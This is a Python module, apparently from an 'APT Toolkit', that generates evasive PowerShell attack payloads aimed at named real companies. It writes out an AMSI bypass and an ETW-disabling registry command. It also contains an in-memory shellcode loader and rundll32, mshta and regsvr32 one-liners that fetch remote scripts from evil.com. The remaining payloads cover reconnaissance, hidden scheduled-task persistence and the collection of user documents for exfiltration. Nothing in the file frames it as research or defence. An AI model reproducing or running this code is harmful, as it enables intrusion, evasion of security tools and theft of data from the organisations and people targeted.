#!/usr/bin/env python3
"""
Advanced Payload Generator for APT Toolkit

This module generates sophisticated payloads with advanced evasion techniques
for Windows Defender and other antivirus solutions.
"""

import os
import sys
import random
import string
import hashlib
import base64
import json
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Any, Optional

class AdvancedPayloadGenerator:
    """Advanced payload generator with evasion techniques"""
    
    def __init__(self, emails_db_path="../emails/unique_emails.db"):
        self.db_path = emails_db_path
        self.evasion_techniques = [
            "polymorphic_code",
            "string_obfuscation",
            "api_hashing",
            "process_hollowing",
            "amsi_bypass",
            "etw_bypass",
            "memory_only",
            "template_injection",
            "environmental_keying",
            "lolbin_usage"
        ]
        
    def generate_random_string(self, length: int = 10) -> str:
        """Generate random string for obfuscation"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def obfuscate_string(self, text: str) -> str:
        """Obfuscate string using various techniques"""
        # Multiple obfuscation layers
        techniques = [
            lambda s: base64.b64encode(s.encode()).decode(),
            lambda s: ''.join([chr(ord(c) ^ 42) for c in s]),
            lambda s: s.encode('rot13'),
            lambda s: hashlib.md5(s.encode()).hexdigest()[:len(s)]
        ]
        
        result = text
        for technique in random.sample(techniques, random.randint(1, 3)):
            try:
                result = technique(result)
            except:
                pass
        
        return result
    
    def generate_powershell_amsi_bypass(self) -> str:
        """Generate AMSI bypass techniques"""
        return """
# AMSI Bypass via Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
"""
    
    def generate_etw_bypass(self) -> str:
        """Generate ETW bypass techniques"""
        return """
# ETW Bypass via Registry
Remove-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winevt\\Channels\\Microsoft-Windows-PowerShell/Operational" -Name "Enabled" -ErrorAction SilentlyContinue
"""
    
    def generate_polymorphic_powershell(self, base_payload: str, technique: str = "polymorphic_code") -> str:
        """Generate polymorphic PowerShell payload"""
        
        # Add random comments and whitespace
        random_comments = [
            f"# {self.generate_random_string(20)}",
            f"# Generated: {datetime.now().isoformat()}",
            f"# System: {self.generate_random_string(15)}",
            f"# Process: {self.generate_random_string(12)}"
        ]
        
        # Variable name obfuscation
        var_mapping = {}
        original_vars = ["result", "data", "temp", "output", "process"]
        for var in original_vars:
            var_mapping[var] = self.generate_random_string(8)
        
        # Apply variable renaming
        modified_payload = base_payload
        for old_var, new_var in var_mapping.items():
            modified_payload = modified_payload.replace(f"${old_var}", f"${new_var}")
        
        # Add evasion techniques based on selected method
        evasion_code = ""
        if "amsi_bypass" in technique:
            evasion_code += self.generate_powershell_amsi_bypass() + "\n\n"
        
        if "etw_bypass" in technique:
            evasion_code += self.generate_etw_bypass() + "\n\n"
        
        # Combine everything
        final_payload = "\n".join(random_comments) + "\n\n" + evasion_code + modified_payload
        
        return final_payload
    
    def generate_memory_execution_payload(self) -> str:
        """Generate memory-only execution payload"""
        
        # Simple memory execution payload
        payload = """
# Memory execution with evasion
$code = @'
using System;
using System.Runtime.InteropServices;

public class MemoryExec {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
'@

Add-Type -TypeDefinition $code

# Placeholder for shellcode
$shellcode = [System.Convert]::FromBase64String("")

# Allocate and execute
if ($shellcode.Length -gt 0) {
    $mem = [MemoryExec]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)
    $thread = [MemoryExec]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    [MemoryExec]::WaitForSingleObject($thread, 0xFFFFFFFF)
}
"""
        
        return self.generate_polymorphic_powershell(payload, "memory_only")
    
    def generate_lolbin_payload(self, technique: str = "rundll32") -> str:
        """Generate Living-off-the-land binary payload"""
        
        lolbin_payloads = {
            "rundll32": """
# Rundll32 technique
Start-Process "rundll32.exe" -ArgumentList "javascript:\\"\\\\..\\\\mshtml,RunHTMLApplication \\";document.write();GetObject(\\"script:https://evil.com/payload.sct\\")\""
""",
            "mshta": """
# MSHTA technique
Start-Process "mshta.exe" -ArgumentList "javascript:document.write();GetObject(\\"script:https://evil.com/payload.hta\\")"
""",
            "regsvr32": """
# Regsvr32 technique
Start-Process "regsvr32.exe" -ArgumentList "/s", "/n", "/u", "/i:https://evil.com/payload.sct", "scrobj.dll"
"""
        }
        
        return lolbin_payloads.get(technique, lolbin_payloads["rundll32"])
    
    def generate_organization_specific_payload(self, organization: str, campaign_type: str) -> Dict[str, Any]:
        """Generate organization-specific payload with evasion"""
        
        # Select random evasion techniques
        selected_techniques = random.sample(self.evasion_techniques, random.randint(2, 4))
        
        # Generate base payload based on campaign type
        if campaign_type == "reconnaissance":
            base_payload = self.generate_recon_payload()
        elif campaign_type == "persistence":
            base_payload = self.generate_persistence_payload()
        elif campaign_type == "data_exfiltration":
            base_payload = self.generate_exfiltration_payload()
        else:
            base_payload = self.generate_recon_payload()
        
        # Apply evasion techniques
        final_payload = self.generate_polymorphic_powershell(base_payload, "".join(selected_techniques))
        
        return {
            "organization": organization,
            "campaign_type": campaign_type,
            "evasion_techniques": selected_techniques,
            "payload": final_payload,
            "generated_at": datetime.now().isoformat(),
            "signature": hashlib.sha256(final_payload.encode()).hexdigest()
        }
    
    def generate_recon_payload(self) -> str:
        """Generate reconnaissance payload"""
        return """
# System reconnaissance
$systemInfo = @{
    Hostname = $env:COMPUTERNAME
    Domain = $env:USERDOMAIN
    Username = $env:USERNAME
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
    Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -eq "Ethernet" -or $_.InterfaceAlias -eq "Wi-Fi"}).IPAddress
}

$systemInfo | ConvertTo-Json
"""
    
    def generate_persistence_payload(self) -> str:
        """Generate persistence payload"""
        return """
# Persistence via scheduled task
$taskName = "SystemUpdateTask"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\\Windows\\Temp\\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
"""
    
    def generate_exfiltration_payload(self) -> str:
        """Generate data exfiltration payload"""
        return """
# Data exfiltration
$sensitiveFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.pdf, *.xls, *.xlsx -ErrorAction SilentlyContinue | Select-Object -First 10

if ($sensitiveFiles) {
    $tempZip = "$env:TEMP\\data.zip"
    Compress-Archive -Path $sensitiveFiles.FullName -DestinationPath $tempZip -Force
    # Upload logic would go here
}
"""
    
    def save_payload(self, payload_data: Dict[str, Any], output_dir: str) -> str:
        """Save payload to file"""
        os.makedirs(output_dir, exist_ok=True)
        
        org_slug = payload_data["organization"].lower().replace(' ', '_').replace('.', '')
        campaign_slug = payload_data["campaign_type"].lower().replace(' ', '_')
        
        filename = f"{org_slug}_{campaign_slug}_{int(time.time())}.ps1"
        filepath = os.path.join(output_dir, filename)
        
        with open(filepath, 'w') as f:
            f.write(payload_data["payload"])
        
        # Save metadata
        metadata_file = filepath.replace('.ps1', '_metadata.json')
        with open(metadata_file, 'w') as f:
            json.dump(payload_data, f, indent=2)
        
        return filepath

def main():
    """Main function to demonstrate payload generation"""
    generator = AdvancedPayloadGenerator()
    
    # Generate sample payloads
    organizations = ["Google", "Microsoft", "Apple", "Amazon"]
    campaign_types = ["reconnaissance", "persistence", "data_exfiltration"]
    
    for org in organizations:
        for campaign in campaign_types:
            print(f"Generating payload for {org} - {campaign}")
            payload_data = generator.generate_organization_specific_payload(org, campaign)
            
            output_dir = f"payloads/organizations/{org.lower().replace(' ', '_')}"
            filepath = generator.save_payload(payload_data, output_dir)
            
            print(f"  Saved to: {filepath}")
            print(f"  Evasion techniques: {', '.join(payload_data['evasion_techniques'])}")
            print()

if __name__ == "__main__":
    main()